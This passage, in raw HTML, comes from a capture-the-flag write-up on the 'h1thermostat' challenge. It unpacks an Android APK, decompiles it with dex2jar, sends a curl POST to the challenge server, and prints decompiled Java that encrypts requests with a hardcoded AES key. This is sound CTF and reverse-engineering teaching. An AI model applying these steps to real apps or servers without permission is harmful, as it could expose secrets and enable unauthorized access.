p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=2cd5efeb02a56cd0c6e58fd7757c00ec3585efd485b3110d5efb9aa8b3d92423\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3 id=\"0x01-h1therm\"\u003e(0x01) h1therm\u003c/h3\u003e\n\n\u003cp\u003eThe url from earlier is a shortened URL which leads to a \u003ca href=\"/redirect?url=https%3A%2F%2Fdrive.google.com%2Ffile%2Fd%2F1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ%2Fview\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003egrdive link\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e of an APK, h1thermostat.apk. Okay, so looks like we will need to do some managed-code reversing. APK\u0026#39;s are essentially zip files, so let\u0026#39;s take a peek inside.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ unzip -l h1thermostat.apk\nArchive:  h1thermostat.apk\n  Length      Date    Time    Name\n---------  ---------- -----   ----\n     3188  1980-00-00 00:00   AndroidManifest.xml\n       87  1980-00-00 00:00   META-INF/MANIFEST.MF\n      ...\n  3012436  1980-00-00 00:00   classes.dex\n      ...\n    15132  1980-00-00 00:00   res/mipmap-xxxhdpi-v4/ic_launcher_round.png\n   333076  1980-00-00 00:00   resources.arsc\n---------                     -------\n  4835993                     568 files\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooks like we are dealing with a .dex file, which we will need to decompile to .class files to decompile.\u003cbr\u003e\nLuckily there is a good tool for this, dex2jar. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ dex-tools-2.1-SNAPSHOT\\d2j-dex2jar.bat classes.dex\ndex2jar classes.dex -\u0026gt; ./classes-dex2jar.jar\n$ jda classes-dex2jar.jar\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow let\u0026#39;s analyze this binary. My preferred tool for Java reversing is JDA, which helpfully displays decompiled output side-by-side with Bytecode or an intermediate representation. Looking through a list of strings, we see \u003ccode\u003ettp://35.243.186.41/\u003c/code\u003e, \u003ccode\u003eusername\u003c/code\u003e, \u003ccode\u003epassword\u003c/code\u003e, \u003ccode\u003ecmd\u003c/code\u003e, and \u003ccode\u003egetTemp\u003c/code\u003e. Judging from this, I bet we\u0026#39;re dealing with a login API. So, let\u0026#39;s just try POSTing to it and see what happens.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ curl -X POST http://35.243.186.41/\nD7x4a8mJ/xcxoiH0vPNa6bhXAs/4rCXTORPrJK9wSPzD32NZRiZTgIWq0kjqQpLsUd87ao2/zlkoDu9PfAjs2g==\n$ curl -X POST http://35.243.186.41/ | base64 -d | xxd\n00000000: d2a9 88d7 ae25 4a73 2c5d d4af 36bf 2bc9  .....%Js,]..6.+.\n00000010: 8bdc 4e7f 539b cade d8e1 d18d 1e1b ccb4  ..N.S...........\n00000020: 5ef7 82ff 39b3 9ae4 d261 5a41 b09e 0ec8  ^...9....aZA....\n00000030: 5a1b 3fe4 368a 65c1 b3fe 4669 1092 1c36  Z.?.6.e...Fi...6\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUmm...okay. This is high-entropy data. I guess we need to read the source code. The last four strings, \u003ccode\u003eusername\u003c/code\u003e, \u003ccode\u003epassword\u003c/code\u003e, \u003ccode\u003ecmd\u003c/code\u003e, and \u003ccode\u003egetTemp\u003c/code\u003e, are used in the clas LoginActivity, which simply builds a payload from the login form. The payload is a JSON object that looks like \u003ccode\u003e{\u0026quot;username\u0026quot;: \u0026quot;admin\u0026quot;, \u0026quot;password\u0026quot;: \u0026quot;1234\u0026quot;, \u0026quot;cmd\u0026quot;: \u0026quot;getTemp\u0026quot;}\u003c/code\u003e. The PayloadRequest class actually performs the request, so we will analyze this class in greater detail.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e \u003cspan class=\"kd\"\u003eextends\u003c/span\u003e \u003cspan class=\"nc\"\u003eRequest\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eListener\u003c/span\u003e \u003cspan class=\"n\"\u003emListener\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eHashMap\u003c/span\u003e \u003cspan class=\"n\"\u003emParams\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"nf\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003evar1\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eListener\u003c/span\u003e \u003cspan class=\"n\"\u003evar2\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003esuper\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;http://35.243.186.41/\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eErrorListener\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonErrorResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eVolleyError\u003c/span\u003e \u003cspan class=\"n\"\u003evar1\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"n\"\u003evar2\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eonResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Connection failed\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emListener\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003evar2\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emParams\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eHashMap\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emParams\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;d\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ebuildPayload\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003evar1\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003ebuildPayload\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003evar1\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eSecretKeySpec\u003c/span\u003e \u003cspan class=\"n\"\u003evar2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eSecretKeySpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]{\u003c/span\u003e\u003cspan class=\"mi\"\u003e56\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e79\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e46\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e106\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e26\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e27\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e34\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e59\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e128\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e23\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e90\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e116\u003c/span\u003e\u003cspan class=\"o\"\u003e},\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;AES\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003evar3\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eSecureRandom\u003c/span\u003e\u003cspan class=\"o\"\u003e()).\u003c/span\u003e\u003cspan class=\"na\"\u003enextBytes\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003evar3\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eIvParameterSpec\u003c/span\u003e \u003cspan class=\"n\"\u003evar4\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eIvParameterSpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003evar3\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e \u003cspan class=\"n\"\u003evar5\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetInstance\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;AES/CBC/PKCS5Padding\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003evar5\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003einit\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003evar2\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003evar4\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003evar6\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003evar5\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edoFinal\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003evar1\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoString\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetBytes\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003evar7\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003evar6\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003earraycopy\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003evar3\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003evar7\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003earraycopy\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003evar6\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003evar7\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003evar6\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003eBase64\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eencodeToString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003evar7\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003eprotected\u003c/span\u003e \u003cspan class=\"nc\"\u003eResponse\u003c/span\u003e \u003cspan class=\"nf\"\u003eparseNetworkResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eNetworkResponse\u003c/span\u003e \u003cspan class=\"n\"\u003evar1\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003etry\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003evar2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003evar1\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003evar3\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eBase64\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edecode\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003evar2\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003evar9\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003earraycopy\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003evar3\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003evar9\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003evar6\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003evar3\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003earraycopy\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003evar3\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003evar6\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003evar3\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eSecretKeySpec\u003c/span\u003e \u003cspan class=\"n\"\u003evar11\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eSecretKeySpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]{\u003c/span\u003e\u003cspan class=\"mi\"\u003e56\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e79\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e46\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e106\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e26\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e27\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e34\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e59\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e128\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e23\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e90\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e116\u003c/span\u003e\u003cspan class=\"o\"\u003e},\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;AES\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eIvParameterSpec\u003c/span\u003e \u003cspan class=\"n\"\u003evar4\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eIvParameterSpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003evar9\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e \u003cspan class=\"n\"\u003evar10\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetInstance\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;AES/CBC/PKCS5Padding\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003evar10\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003einit\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003evar11\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003evar4\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003evar9\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003evar10\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan 